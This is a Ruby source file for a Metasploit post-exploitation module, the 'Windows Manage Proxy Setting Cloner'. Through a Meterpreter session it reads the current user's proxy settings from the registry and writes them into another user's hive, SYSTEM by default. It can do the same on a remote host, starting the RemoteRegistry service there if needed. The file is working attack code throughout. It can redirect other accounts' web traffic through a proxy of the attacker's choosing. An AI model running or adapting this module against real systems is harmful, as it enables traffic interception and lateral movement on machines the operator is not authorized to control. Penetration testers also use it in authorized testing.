##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post

  include Msf::Auxiliary::Report

  def initialize(info={})
    super(
        update_info(
            info,
            'Name'        => 'Windows Manage Proxy Setting Cloner',
            'Description'    => %q{
              This module copies the proxy settings from the current user to the
              targeted user SID, supports remote hosts as well if remote registry
              is allowed.
            },
            'Author'      => [ 'mubix' ],
            'License'     => MSF_LICENSE,
            'Platform'      => [ 'win' ],
            'SessionTypes'  => [ 'meterpreter' ]
        )
    )

    register_options(
      [
        OptAddress.new('RHOST',   [ false,  'Remote host to clone settings to, defaults to local' ]),
        OptString.new('SID',   [ false,  'SID of user to clone settings to, defaults to SYSTEM', 'S-1-5-18' ])
      ], self.class)
  end

  def parse_settings(data)
    print_status "\tProxy Counter = #{(data[4,1].unpack('C*'))[0]}"
    case (data[8,1].unpack('C*'))[0]
      when 1
        print_status "\tSetting: No proxy settings"
      when 3
        print_status "\tSetting: Proxy server"
      when 5
        print_status "\tSetting: Set proxy via AutoConfigure script"
      when 7
        print_status "\tSetting: Proxy server and AutoConfigure script"
      when 9
        print_status "\tSetting: WPAD"
      when 11
        print_status "\tSetting: WPAD and Proxy server"
      when 13
        print_status "\tSetting: WPAD and AutoConfigure script"
      when 15
        print_status "\tSetting: WPAD, Proxy server and AutoConfigure script"
      else
        print_status "\tSetting: Unknown proxy setting found"
    end

    cursor = 12
    proxyserver = data[cursor+4, (data[cursor,1].unpack('C*'))[0]]
    print_status "\tProxy Server: #{proxyserver}" if proxyserver != ""

    cursor = cursor + 4 + (data[cursor].unpack('C*'))[0]
    additionalinfo = data[cursor+4, (data[cursor,1].unpack('C*'))[0]]
    print_status "\tAdditional Info: #{additionalinfo}" if additionalinfo != ""

    cursor = cursor + 4 + (data[cursor].unpack('C*'))[0]
    autoconfigurl = data[cursor+4, (data[cursor,1].unpack('C*'))[0]]
    print_status "\tAutoConfigURL: #{autoconfigurl}" if autoconfigurl != ""
  end

  def target_settings(dst_root_key,dst_base_key)

    if datastore['RHOST']
      begin
        dst_key = session.sys.registry.open_remote_key(datastore['RHOST'], dst_root_key)
      rescue ::Rex::Post::Meterpreter::RequestError
        print_error("Unable to contact remote registry service on #{datastore['RHOST']}")
        print_status("Attempting to start service remotely...")
        begin
          service_start('RemoteRegistry',datastore['RHOST'])
        rescue
          print_error('Unable to read registry or start the service, exiting...')
          return
        end
        startedreg = true
        dst_key = session.sys.registry.open_remote_key(datastore['RHOST'], dst_root_key)
      end
      dst_open_key = dst_key.open_key(dst_base_key)
    else
      dst_open_key = session.sys.registry.open_key(dst_root_key, dst_base_key)
    end

    dst_values = dst_open_key.query_value('DefaultConnectionSettings')

    #If we started the service we need to stop it.
    service_stop('RemoteRegistry',datastore['RHOST']) if startedreg

    dst_data = dst_values.data

    print_status('Current proxy settings for target:')
    parse_settings(dst_data)
  end

  def run

    if datastore['SID'] == "" and !datastore['RHOST']
      print_error('No reason to copy the settings on top of themselves, please set a SID or/and RHOST')
      return
    end

    # Pull current user's settings
    src_root_key, src_base_key = session.sys.registry.splitkey("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections")
    src_open_key = session.sys.registry.open_key(src_root_key, src_base_key)
    src_values = src_open_key.query_value('DefaultConnectionSettings')
    src_data = src_values.data
    print_status('Proxy settings being copied:')
    parse_settings(src_data)


    # Print current settings of target
    print_status('Attempting to read target\'s settings...')
    if datastore['SID']
      dst_root_key, dst_base_key = session.sys.registry.splitkey("HKU\\#{datastore['SID']}\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections")
    else
      dst_root_key, dst_base_key = session.sys.registry.splitkey("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections")
    end

    target_settings(dst_root_key, dst_base_key)

    print_status('Cloning... bahh..')

    if datastore['RHOST']
      begin
        dst_key = session.sys.registry.open_remote_key(datastore['RHOST'], dst_root_key)
      rescue ::Rex::Post::Meterpreter::RequestError
        print_error("Unable to contact remote registry service on #{datastore['RHOST']}")
        print_status("Attempting to start service remotely...")
        begin
          service_start('RemoteRegistry',datastore['RHOST'])
        rescue
          print_error('Unable to read registry or start the service, exiting...')
          return
        end
        startedreg2 = true
        dst_key = session.sys.registry.open_remote_key(datastore['RHOST'], dst_root_key)
      end
      dst_open_key = dst_key.create_key(dst_base_key, KEY_WRITE + 0x0000)
    else
      dst_open_key = session.sys.registry.create_key(dst_root_key, dst_base_key, KEY_WRITE + 0x0000)
    end

    #If we started the service we need to stop it.
    service_stop('RemoteRegistry',datastore['RHOST']) if startedreg2

    dst_open_key.set_value('DefaultConnectionSettings', REG_BINARY, src_data)

    print_status('New settings:')
    target_settings(dst_root_key, dst_base_key)

  end

end
